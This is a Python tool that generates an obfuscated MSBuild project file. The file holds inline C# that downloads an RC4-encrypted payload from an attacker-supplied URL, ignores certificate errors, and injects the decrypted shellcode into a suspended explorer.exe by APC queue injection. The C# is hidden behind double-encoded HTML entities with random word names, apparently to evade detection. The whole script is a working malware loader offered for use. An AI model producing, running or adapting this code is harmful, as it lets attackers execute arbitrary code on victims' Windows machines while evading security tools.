import random
import re
import html
import nltk
import argparse
import sys

template = r'''<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE __doctype__ [
§ENTITIES§
]>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="__name__">
        <__name__/>
        <Update />
    </Target>
    <PropertyGroup>
        <__varhtml__>
§ENTITY_NAMES§
        </__varhtml__>
    </PropertyGroup>
    <UsingTask
        TaskName="__name__"
        AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"
        TaskFactory="CodeTaskFactory">
        <ParameterGroup/>
        <Task>
            <Using Namespace="System" />
            <Using Namespace="System.IO"/>
            <Code Type="Fragment" Language="cs">
            </Code>
        </Task>
    </UsingTask>
    <UsingTask
        TaskName="Update"
        AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"
        TaskFactory="CodeTaskFactory">
        <Task>
            <Code Type="Class" Language="Csharp">
                <![CDATA[
                    $(__varhtml__)
                ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>
'''

def generate_code_template(url, key, offset):
    # Convert URL to byte array format
    url_bytes = ', '.join(f'0x{ord(c):02x}' for c in url)
    
    code = f'''
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;

public class Update : Task, ITask
{{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            AllocationProtect flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      Int32 nSize,
      ref Int32 lpNumberOfBytesWritten);

    public struct PROCESS_INFORMATION
    {{
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }}

    public struct STARTUPINFO
    {{
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }}

    [Flags]
    public enum CreationFlags : uint
    {{
        RunImmediately = 0,
        CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
    }}

    [Flags]
    public enum AllocationType
    {{
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }}

    [Flags]
    public enum AllocationProtect : uint
    {{
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400
    }}


    public override bool Execute()
    {{
        string target = "c:\\\\windows\\\\explorer.exe";
        string key = "{key}";

        ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        System.Net.WebClient client = new System.Net.WebClient();
        
        byte[] url = {{ {url_bytes} }};

        byte[] data = client.DownloadData(Encoding.ASCII.GetString(url));
        byte[] code = Decrypt(data, key);

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, (uint)CreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
        IntPtr hProcess = pi.hProcess;
        IntPtr threadHandle = pi.hThread;

        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)code.Length, AllocationType.Commit, AllocationProtect.PAGE_EXECUTE_READ);
        Int32 bytesWritten = 0;
        WriteProcessMemory(hProcess, addr, code, code.Length, ref bytesWritten);
        QueueUserAPC(addr, threadHandle, 0);
        ResumeThread(threadHandle);

        return true;
    }}

    public static byte[] RC4(byte[] bytes, byte[] key)
    {{
        byte[] z = new byte[bytes.Length];
        byte[] s = new byte[256];
        byte[] k = new byte[256];
        byte temp;
        int i, j;

        for (i = 0; i < 256; i++)
        {{
            s[i] = (byte)i;
            k[i] = key[i % key.GetLength(0)];
        }}

        j = 0;
        for (i = 0; i < 256; i++)
        {{
            j = (j + s[i] + k[i]) % 256;
            temp = s[i];
            s[i] = s[j];
            s[j] = temp;
        }}

        i = j = 0;
        for (int x = 0; x < z.GetLength(0); x++)
        {{
            i = (i + 1) % 256;
            j = (j + s[i]) % 256;
            temp = s[i];
            s[i] = s[j];
            s[j] = temp;
            int t = (s[i] + s[j]) % 256;
            z[x] = (byte)(bytes[x] ^ s[t]);
        }}
        return z;
    }}

    private static byte[] Decrypt(byte[] enc, string pKey)
    {{
        byte[] key = Encoding.UTF8.GetBytes(pKey);
        byte[] dec;
        int index = {offset};
        byte[] extracted = new byte[enc.Length - index];
        Array.Copy(enc, index, extracted, 0, extracted.Length);
        dec = RC4(extracted, key);
        return dec;
    }}
}}
'''
    return code

def html_hex_encode(s):
    html_entity_encoded = ''.join(f'&#{ord(c)};' for c in s)
    double_encoded = ''.join(f'&#{ord(c)};' for c in html_entity_encoded)
    return double_encoded

def prepare(template, code):
    try:
        from nltk.corpus import words
        wordlist = words.words()
    except:
        nltk.download('words')
        from nltk.corpus import words
        wordlist = words.words()
    
    entities = ""
    entity_names = []

    chunks = code.split("\n")
    for chunk in chunks:
        chunk = chunk.lstrip(" ").rstrip(" ")
        chunk = chunk.lstrip("\t").rstrip("\t")
        if len(chunk) == 0:
            continue

        enc = html_hex_encode(f"{chunk}\n")
        entity_name = random.choice(wordlist)
        entity_names.append(entity_name)
        entities += f"<!ENTITY {entity_name} \"{enc}\">"

    template = re.sub(r'§ENTITIES§', entities, template)

    entity_refs = ""
    for i, name in enumerate(entity_names):
        entity_refs += f"&{name};"
    entity_refs +="\n"

    template = re.sub(r'§ENTITY_NAMES§', entity_refs, template)
    template = re.sub(r'__doctype__', "Project", template)

    placeholders = re.findall(r'__(\w+)__', template)
    replacement_map = {placeholder: random.choice(wordlist) for placeholder in set(placeholders)}

    for placeholder in placeholders:
        template = re.sub(rf'__{placeholder}__', replacement_map[placeholder], template)

    return template

def main():
    parser = argparse.ArgumentParser(description='Generate obfuscated MSBuild XML with custom parameters')
    parser.add_argument('--url', required=True, help='URL to download payload from')
    parser.add_argument('--key', required=True, help='RC4 decryption key')
    parser.add_argument('--offset', type=int, required=True, help='Offset value for payload extraction')
    parser.add_argument('--output', default='msbuild.csproj', help='Output filename (default: msbuild.csproj)')

    args = parser.parse_args()

    print(f"[+] Generating MSBuild XML with:")
    print(f"    URL: {args.url}")
    print(f"    Key: {args.key}")
    print(f"    Offset: {args.offset}")
    print(f"    Output: {args.output}")

    code = generate_code_template(args.url, args.key, args.offset) 
    prepared_xml = prepare(template, code)
    
    print("[+] Obfuscating XML")
    result_xml = prepared_xml.replace("\n","")
    result_xml = re.sub(r'\s+', ' ', result_xml)

    with open(args.output, "w+") as f:
        f.write(result_xml)

    print(f"[+] XML written to {args.output}")

if __name__ == "__main__":
    main()
